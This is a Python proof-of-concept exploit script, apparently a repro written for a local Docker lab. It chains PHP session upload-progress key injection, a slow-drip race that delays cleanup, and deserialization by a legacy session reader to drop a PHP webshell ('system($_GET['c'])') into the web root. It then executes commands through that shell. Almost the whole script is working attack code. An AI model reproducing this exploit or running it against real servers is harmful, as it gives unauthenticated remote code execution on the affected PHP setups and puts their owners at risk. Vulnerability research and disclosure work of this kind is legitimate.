#!/usr/bin/env python3
"""
php2shell repro — race-the-cleanup chain against Apache 2.4 prefork +
mod_php 8.5.12 (official image; php_serialize writes, legacy 'php' read).

  P1  unauth multipart POST: PHP_SESSION_UPLOAD_PROGRESS value becomes part of
      the session key RAW (no escaping). php_serialize accepts the key
      (unlike the 'php' writer, which rejects '|') and the rfc1867 hook flushes
      it to disk at FILE_START, mid-parse.
  P2  slow-drip the body: MULTIPART_EVENT_END (and thus cleanup, which would
      delete the key) only fires when the parse finishes. The drip stretches
      the poisoned window from microseconds to seconds.
  P3  concurrently, a legacy endpoint reads the same session with the 'php'
      handler: the file is split at the first '|' — inside our key — and
      unserialize() instantiates our object in normal context.
      DeferredWriter.__destruct() drops /var/www/html/p2s_shell.php.
  P4  GET the webshell.

Requires: DOCKER_HOST=tcp://host.docker.internal:2375
"""
from __future__ import annotations
import os, socket, subprocess, threading, time

H = os.environ.get("P2S_HOST", "host.docker.internal")
P = int(os.environ.get("P2S_PORT", "18212"))
SID = "p2s" + "c0ffee" * 4 + "00"

def s_field(v: bytes) -> bytes:
    return b's:%d:"' % len(v) + v + b'"'

def build_object(shell_path: str, code: bytes) -> bytes:
    return (b'O:14:"DeferredWriter":2:{'
            + s_field(b"path") + b";" + s_field(shell_path.encode()) + b";"
            + s_field(b"data") + b";" + s_field(code) + b";" + b"}")

def get(path: str, sid: str | None = None, timeout: float = 8) -> bytes:
    try:
        with socket.create_connection((H, P), timeout=timeout) as s:
            req = f"GET {path} HTTP/1.1\r\nHost: {H}\r\nConnection: close\r\n"
            if sid:
                req += f"Cookie: PHPSESSID={sid}\r\n"
            s.sendall(req.encode() + b"\r\n")
            r = b""
            while True:
                d = s.recv(65536)
                if not d:
                    break
                r += d
        return r
    except OSError:
        return b""

def drip(sid: str, key_suffix: bytes, stall: int = 45) -> None:
    body = (b'--b\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            + key_suffix + b"\r\n"
            b'--b\r\nContent-Disposition: form-data; name="f"; filename="x"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n' + b"A" * 16)
    req = (b"POST /empty.php HTTP/1.1\r\nHost: x\r\nConnection: close\r\n"
           b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
           b"Content-Type: multipart/form-data; boundary=b\r\n"
           b"Content-Length: " + str(len(body) + 600 * stall).encode() + b"\r\n\r\n" + body)
    try:
        with socket.create_connection((H, P), timeout=10) as s:
            s.sendall(req)
            t0 = time.time()
            while time.time() - t0 < stall:
                s.sendall(b"A" * 600)     # > reqtimeout minrate=500
                time.sleep(1)
    except OSError:
        pass

def sess_file(sid: str) -> bytes:
    r = subprocess.run(["docker", "exec", "p2svic", "sh", "-c", f"cat /tmp/sess_{sid} 2>/dev/null"],
                       capture_output=True).stdout
    return r

def main() -> int:
    print(f"[*] target http://{H}:{P}  sid={SID}")
    print("\n== Phase 0: clean session ==")
    r = get("/index.php", SID)
    print("   ", r.split(b"\r\n\r\n", 1)[1].decode().strip() if b"\r\n\r\n" in r else r[:120])

    print("\n== Phase 1+2: poison (slow-drip) + concurrent trigger race ==")
    code = b"<?php system($_GET['c']); ?>"
    key_suffix = b"inj|" + build_object("/var/www/html/p2s_shell.php", code)
    t = threading.Thread(target=drip, args=(SID, key_suffix), daemon=True)
    t.start()

    shell = False
    # wait for the poisoned key to appear in the session file, then hammer
    # the legacy reader inside the stretched window
    t0 = time.time()
    while time.time() - t0 < 40:
        if b"DeferredWriter" in sess_file(SID):
            print(f"[+] poison visible at t={time.time()-t0:.1f}s — triggering legacy read")
            for _ in range(15):
                get("/legacy.php", SID, timeout=4)
                r = get("/p2s_shell.php?c=id", None, timeout=4)
                if b"uid=" in r:
                    shell = True
                    break
                time.sleep(0.15)
            break
        time.sleep(0.25)

    print("\n== Phase 3: webshell ==")
    if not shell:
        r = get("/p2s_shell.php?c=id", None)
        shell = b"uid=" in r
    if shell:
        print("   ", r.split(b"\r\n\r\n", 1)[1].decode().strip())
        print("\n[+] RCE CONFIRMED — unauthenticated webshell on fully-patched PHP 8.5.12")
        return 0
    print("[-] no shell; session file now:", sess_file(SID)[:160])
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
